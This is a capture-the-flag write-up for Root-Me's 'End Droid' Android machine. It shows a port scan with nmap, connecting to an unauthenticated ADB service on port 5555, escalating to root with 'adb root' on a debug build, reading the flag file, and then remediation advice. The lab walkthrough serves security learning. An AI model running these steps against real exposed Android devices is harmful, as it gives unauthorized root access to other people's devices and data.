# Root-Me: End Droid (CTF All The Day)

## Task description
* **os:** Android (x86)
* **goal:** Get access to device, get root access and read flag in `/data/media/0/passwd`.

---

## 1. Reconnaissance
At first, I pinged the server to make sure it was reachable
```bash
rifa@Rifa88:~$ ping -c 3 ctf11.root-me.org
PING ctf11.root-me.org (212.83.175.116) 56(84) bytes of data.
64 bytes from ctf11.root-me.org (212.83.175.116): icmp_seq=1 ttl=50 time=94.7 ms
64 bytes from ctf11.root-me.org (212.83.175.116): icmp_seq=2 ttl=50 time=77.7 ms
64 bytes from ctf11.root-me.org (212.83.175.116): icmp_seq=3 ttl=50 time=79.9 ms

--- ctf11.root-me.org ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 77.685/84.085/94.654/7.528 ms
```
Then I scanned all tcp ports with `nmap`:
```bash
rifa@Rifa88:~$ sudo nmap -sS -p- --min-rate=2000 -v ctf11.root-me.org
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-23 22:03 MSK
Initiating Ping Scan at 22:03
Scanning ctf11.root-me.org (212.83.175.116) [4 ports]
Completed Ping Scan at 22:03, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 22:03
Completed Parallel DNS resolution of 1 host. at 22:03, 0.14s elapsed
Initiating SYN Stealth Scan at 22:03
Scanning ctf11.root-me.org (212.83.175.116) [65535 ports]
Discovered open port 8080/tcp on 212.83.175.116
Discovered open port 5555/tcp on 212.83.175.116
```
There are a couple of interesting ports:

port 8080/tcp on 212.83.175.116 – HTTP web server
port 5555/tcp on 212.83.175.116 – Android Debug Bridge

8080 HTTP port is using for running web applications without root (get the a challenge validation flag (Realistic)), and will not be needed for getting the machine validation flag.

5555 Android Debug Bridge (ADB) port is using for connecting to device via ADB (and in the future for getting  the machine validation flag).


## 2. Entry point
I tried to connect to open port 5555 (ADB) and entered the shell:
```bash
rifa@Rifa88:~$ adb connect ctf11.root-me.org:5555
* daemon not running; starting now at tcp:5037
* daemon started successfully
connected to ctf11.root-me.org:5555
rifa@Rifa88:~$ adb shell
uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)@x86:/ $ 
```
I successfully connected to ADB and entered the shell as uid=2000(shell)!

Upon trying to read the flag file `/data/media/0/passwd` (the same as ‘/sdcard’) system returns `Permission denied` because the file permissions are set to `-r--r----- root sdcard_r`. I'm already in the sdcard_r group but android restricts access via SELinux and sdcardfs, that's why I need root.
```bash
127|uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)@x86:/sdcard $ cat passwd                                
/system/bin/sh: cat: passwd: Permission denied
1|uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)@x86:/sdcard $ ls -la /sdcard/passwd
-r--r----- root     sdcard_r       33 2026-11-23 22:00 passwd
```
## 3. Privilege escalation
Assuming the system might be built in debug mode, I tried to restart ```adbd``` as root:
```bash
rifa@Rifa88:~$ adb root
rifa@Rifa88:~$ adb shell
uid=0(root) gid=0(root)@x86:/ #
```
After reconnecting, we obtain a shell with root

## 4. Getting the flag
```bash
rifa@Rifa88:~$ adb shell
uid=0(root) gid=0(root)@x86:/ # cat /data/media/0/passwd
********************************
```

## 5. Conclusion & Remediation
The root was got due to a boot2root: an unauthenticated Android Debug Bridge (ADB) on debug build (`userdebug`) was open directly to the internet on port `5555`.
You need to:
Enable ADB authorization via RSA keys, use release builds (`user`) instead of debugs (`userdebug`) and disable ADB via wireless mode or close inbound connection to port `5555` by using firewall.
